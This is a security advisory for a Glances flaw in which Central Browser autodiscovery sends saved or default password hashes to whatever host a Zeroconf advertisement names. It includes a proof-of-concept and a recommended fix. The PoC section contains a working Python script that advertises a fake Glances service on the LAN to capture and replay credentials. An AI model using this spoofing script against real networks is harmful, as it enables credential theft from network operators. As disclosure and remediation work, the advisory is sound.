# [H] Glances Central Browser Autodiscovery Leaks Reusable Credentials to Zeroconf-Spoofed Servers

## Summary
Severity: High
Advisory: GHSA-vx5f-957p-qpvm
CVE: CVE-2026-32634
CWE: CWE-346, CWE-522
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-vx5f-957p-qpvm
Type: github-advisory

## Affected
- PyPI: `Glances` — affected >=0 <4.5.2

## Details
## Summary

In Central Browser mode, Glances stores both the Zeroconf-advertised server name and the discovered IP address for dynamic servers, but later builds connection URIs from the untrusted advertised name instead of the discovered IP. When a dynamic server reports itself as protected, Glances also uses that same untrusted name as the lookup key for saved passwords and the global `[passwords] default` credential.

An attacker on the same local network can advertise a fake Glances service over Zeroconf and cause the browser to automatically send a reusable Glances authentication secret to an attacker-controlled host. This affects the background polling path and the REST/WebUI click-through path in Central Browser mode.

## Details

Dynamic server discovery keeps both a short `name` and a separate `ip`:

```python
# glances/servers_list_dynamic.py:56-61
def add_server(self, name, ip, port, protocol='rpc'):
    new_server = {
        'key': name,
        'name': name.split(':')[0],  # Short name
        'ip': ip,  # IP address seen by the client
        'port': port,
        ...
        'type': 'DYNAMIC',
    }
```

The Zeroconf listener populates those fields directly from the service advertisement:

```python
# glances/servers_list_dynamic.py:112-121
new_server_ip = socket.inet_ntoa(address)
new_server_port = info.port
...
self.servers.add_server(
    srv_name,
    new_server_ip,
    new_server_port,
    protocol=new_server_protocol,
)
```

However, the Central Browser connection logic ignores `server['ip']` and instead uses the untrusted advertised `server['name']` for both password lookup and the destination URI:

```python
# glances/servers_list.py:119-130
def get_uri(self, server):
    if server['password'] != "":
        if server['status'] == 'PROTECTED':
            clear_password = self.password.get_password(server['name'])
            if clear_password is not None:
                server['password'] = self.password.get_hash(clear_password)
        uri = 'http://{}:{}@{}:{}'.format(
            server['username'],
            server['password'],
            server['name'],
            server['port'],
        )
    else:
        uri = 'http://{}:{}'.format(server['name'], server['port'])
    return uri
```

That URI is used automatically by the background polling thread:

```python
# glances/servers_list.py:141-143
def __update_stats(self, server):
    server['uri'] = self.get_uri(server)
```

The password lookup itself falls back to the global default password when there is no exact match:

```python
# glances/password_list.py:45-58
def get_password(self, host=None):
    ...
    try:
        return self._password_dict[host]
    except (KeyError, TypeError):
        try:
            return self._password_dict['default']
        except (KeyError, TypeError):
            return None
```

The sample configuration explicitly supports that `default` credential reuse:

```ini
# conf/glances.conf:656-663
[passwords]
# Define the passwords list related to the [serverlist] section
# ...
#default=defaultpassword
```

The secret sent over the network is not the cleartext password, but it is still a reusable Glances authentication credential. The client hashes the configured password and sends that hash over HTTP Basic authentication:

```python
# glances/password.py:72-74,94
# For Glances client, get the password (confirm=False, clear=True):
#     2) the password is hashed with SHA-pbkdf2_hmac (only SHA string transit
password = password_hash
```

```python
# glances/client.py:55-57
if args.password != "":
    self.uri = f'http://{args.username}:{args.password}@{args.client}:{args.port}'
```

There is an inconsistent trust boundary in the interactive browser code as well:

- `glances/client_browser.py:44` opens the REST/WebUI target via `webbrowser.open(self.servers_list.get_uri(server))`, which again trusts `server['name']`
- `glances/client_browser.py:55` fetches saved passwords with `self.servers_list.password.get_password(server['name'])`
- `glances/client_browser.py:76` uses `server['ip']` for the RPC client connection

That asymmetry shows the intended safe destination (`ip`) is already available, but the credential-bearing URI and password binding still use the attacker-controlled Zeroconf name.

### Exploit Flow

1. The victim runs Glances in Central Browser mode with autodiscovery enabled and has a saved Glances password in `[passwords]` (especially `default=...`).
2. An attacker on the same multicast domain advertises a fake `_glances._tcp.local.` service with an attacker-controlled service name.
3. Glances stores the discovered server as `{'name': <advertised-name>, 'ip': <discovered-ip>, ...}`.
4. The background stats refresh calls `get_uri(server)`.
5. Once the fake server causes the entry to become `PROTECTED`, `get_uri()` looks up a saved password by the attacker-controlled `name`, falls back to `default` if present, hashes it, and builds `http://username:hash@<advertised-name>:<port>`.
6. The attacker receives a reusable Glances authentication secret and can replay it against Glances servers using the same credential.

## PoC

### Step 1: Verified local logic proof

The following command executes the real `glances/servers_list.py` `get_uri()` implementation (with unrelated imports stubbed out) and demonstrates that:

- password lookup happens against `server['name']`, not `server['ip']`
- the generated credential-bearing URI uses `server['name']`, not `server['ip']`

```bash
cd D:\bugcrowd\glances\repo
@'
import importlib.util
import sys
import types
from pathlib import Path

pkg = types.ModuleType('glances')
pkg.__apiversion__ = '4'
sys.modules['glances'] = pkg

client_mod = types.ModuleType('glances.client')
class GlancesClientTransport: pass
client_mod.GlancesClientTransport = GlancesClientTransport
sys.modules['glances.client'] = client_mod

globals_mod = types.ModuleType('glances.globals')
globals_mod.json_loads = lambda x: x
sys.modules['glances.globals'] = globals_mod

logger_mod = types.ModuleType('glances.logger')
logger_mod.logger = types.SimpleNamespace(
    debug=lambda *a, **k: None,
    warning=lambda *a, **k: None,
    info=lambda *a, **k: None,
    error=lambda *a, **k: None,
)
sys.modules['glances.logger'] = logger_mod

password_list_mod = types.ModuleType('glances.password_list')
class GlancesPasswordList: pass
password_list_mod.GlancesPasswordList = GlancesPasswordList
sys.modules['glances.password_list'] = password_list_mod

dynamic_mod = types.ModuleType('glances.servers_list_dynamic')
class GlancesAutoDiscoverServer: pass
dynamic_mod.GlancesAutoDiscoverServer = GlancesAutoDiscoverServer
sys.modules['glances.servers_list_dynamic'] = dynamic_mod

static_mod = types.ModuleType('glances.servers_list_static')
class GlancesStaticServer: pass
static_mod.GlancesStaticServer = GlancesStaticServer
sys.modules['glances.servers_list_static'] = static_mod

spec = importlib.util.spec_from_file_location('tested_servers_list', Path('glances/servers_list.py'))
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
GlancesServersList = mod.GlancesServersList

class FakePassword:
    def get_password(self, host=None):
        print(f'lookup:{host}')
        return 'defaultpassword'
    def get_hash(self, password):
        return f'hash({password})'

sl = GlancesServersList.__new__(GlancesServersList)
sl.password = FakePassword()
server = {
    'name': 'trusted-host',
    'ip': '203.0.113.77',
    'port': 61209,
    'username': 'glances',
    'password': None,
    'status': 'PROTECTED',
    'type': 'DYNAMIC',
}

print(sl.get_uri(server))
print(server)
'@ | python -
```

Verified output:

```text
lookup:trusted-host
http://glances:hash(defaultpassword)@trusted-host:61209
{'name': 'trusted-host', 'ip': '203.0.113.77', 'port': 61209, 'username': 'glances', 'password': 'hash(defaultpassword)', 'status': 'PROTECTED', 'type': 'DYNAMIC'}
```

This confirms the code path binds credentials to the advertised `name` and ignores the discovered `ip`.

### Step 2: Live network reproduction

1. Configure a reusable browser password:

```ini
# glances.conf
[passwords]
default=SuperSecretBrowserPassword
```

2. Start Glances in Central Browser mode on the victim machine:

```bash
glances --browser -C ./glances.conf
```

3. On an attacker-controlled machine on the same LAN, advertise a fake Glances Zeroconf service and return HTTP 401 / XML-RPC auth failures so the entry becomes `PROTECTED`:

```python
from zeroconf import ServiceInfo, Zeroconf
import socket
import time

zc = Zeroconf()
info = ServiceInfo(
    "_glances._tcp.local.",
    "198.51.100.50:61209._glances._tcp.local.",
    addresses=[socket.inet_aton("198.51.100.50")],
    port=61209,
    properties={b"protocol": b"rpc"},
    server="ignored.local.",
)
zc.register_service(info)
time.sleep(600)
```

4. On the next Central Browser refresh, Glances first probes the fake server, marks it `PROTECTED`, then retries with:

```text
http://glances:<pbkdf2_hash_of_default_password>@198.51.100.50:61209
```

5. The attacker captures the Basic-auth credential and can replay that value as the Glances password hash against Glances servers that share the same configured password.

## Impact

- **Credential exfiltration from browser operators:** An adjacent-network attacker can harvest the reusable Glances authentication secret from operators running Central Browser mode with saved passwords.
- **Authentication replay:** The captured pbkdf2-derived Glances password hash can be replayed against Glances servers that use the same credential.
- **REST/WebUI click-through abuse:** For REST servers, `webbrowser.open(self.servers_list.get_uri(server))` can open attacker-controlled URLs with embedded credentials.
- **No user click required for background theft:** The stats refresh thread uses the vulnerable path automatically once the fake service is marked `PROTECTED`.
- **Affected scope:** This is limited to Central Browser deployments with autodiscovery enabled and saved/default passwords configured. Static server entries and standalone non-browser use are not directly affected by this specific issue.

## Recommended Fix

Use the discovered `ip` as the only network destination for autodiscovered servers, and do not automatically apply saved or default passwords to dynamic entries.

```python
# glances/servers_list.py

def _get_connect_host(self, server):
    if server.get('type') == 'DYNAMIC':
        return server['ip']
    return server['name']

def _get_preconfigured_password(self, server):
    # Dynamic Zeroconf entries are untrusted and should not inherit saved/default creds
    if server.get('type') == 'DYNAMIC':
        return None
    return self.password.get_password(server['name'])

def get_uri(self, server):
    host = self._get_connect_host(server)
    if server['password'] != "":
        if server['status'] == 'PROTECTED':
            clear_password = self._get_preconfigured_password(server)
            if clear_password is not None:
                server['password'] = self.password.get_hash(clear_password)
        return 'http://{}:{}@{}:{}'.format(server['username'], server['password'], host, server['port'])
    return 'http://{}:{}'.format(host, server['port'])
```

And use the same `_get_preconfigured_password()` logic in `glances/client_browser.py` instead of calling `self.servers_list.password.get_password(server['name'])` directly.

## References
- https://github.com/nicolargo/glances/security/advisories/GHSA-vx5f-957p-qpvm
- https://nvd.nist.gov/vuln/detail/CVE-2026-32634
- https://github.com/nicolargo/glances/commit/61d38eec521703e41e4933d18d5a5ef6f854abd5
- https://github.com/nicolargo/glances
- https://github.com/nicolargo/glances/releases/tag/v4.5.2
